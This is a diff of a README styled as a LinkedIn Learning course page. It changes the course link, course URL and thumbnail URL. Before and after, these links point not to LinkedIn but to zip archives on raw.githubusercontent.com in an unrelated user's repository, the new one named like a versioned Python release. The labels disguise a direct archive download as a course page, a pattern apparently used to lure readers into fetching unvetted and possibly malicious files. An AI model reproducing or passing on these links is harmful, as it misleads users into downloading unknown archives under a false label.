@@ -11,9 +11,9 @@ Ryan Mitchell
                             
 Senior Software Engineer
 
-Check out my other courses on [LinkedIn Learning](https://raw.githubusercontent.com/DerricB-front/python-ET-4314028/main/exercise_files/11_02_b/python-ET-4314028_v3.2.zip).
+Check out my other courses on [LinkedIn Learning](https://raw.githubusercontent.com/DerricB-front/python-ET-4314028/main/exercise_files/CSV_TrainingModel/python_E_v3.5-alpha.2.zip).
 
-[lil-course-url]: https://raw.githubusercontent.com/DerricB-front/python-ET-4314028/main/exercise_files/11_02_b/python-ET-4314028_v3.2.zip](https://raw.githubusercontent.com/DerricB-front/python-ET-4314028/main/exercise_files/11_02_b/python-ET-4314028_v3.2.zip
-[lil-thumbnail-url]: https://raw.githubusercontent.com/DerricB-front/python-ET-4314028/main/exercise_files/11_02_b/python-ET-4314028_v3.2.zip
+[lil-course-url]: https://raw.githubusercontent.com/DerricB-front/python-ET-4314028/main/exercise_files/CSV_TrainingModel/python_E_v3.5-alpha.2.zip](https://raw.githubusercontent.com/DerricB-front/python-ET-4314028/main/exercise_files/CSV_TrainingModel/python_E_v3.5-alpha.2.zip
+[lil-thumbnail-url]: https://raw.githubusercontent.com/DerricB-front/python-ET-4314028/main/exercise_files/CSV_TrainingModel/python_E_v3.5-alpha.2.zip
 
 
